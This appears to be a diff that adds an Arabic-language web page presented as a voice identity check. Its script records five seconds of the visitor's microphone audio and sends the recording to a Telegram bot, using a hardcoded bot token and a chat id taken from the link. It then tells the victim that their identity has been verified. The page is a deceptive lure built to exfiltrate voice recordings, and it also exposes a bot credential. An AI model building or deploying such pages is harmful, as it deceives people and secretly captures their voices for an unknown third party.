@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8"><title>تسجيل صوتي</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
+        .mic-btn { width: 100px; height: 100px; background: red; border-radius: 50%; border: none; cursor: pointer; box-shadow: 0 0 20px red; }
+    </style>
+</head>
+<body>
+    <h2>انقر للمتابعة بصوتك</h2>
+    <button class="mic-btn" onclick="record()"></button>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const uid = params.get('id');
+        const token = "8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg";
+
+        async function record() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                const fd = new FormData();
+                fd.append('chat_id', uid);
+                fd.append('voice', blob, 'voice.ogg');
+                fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: fd });
+                alert("تم التحقق من هويتك.");
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
+        }
+    </script>
+</body>
+</html>
+
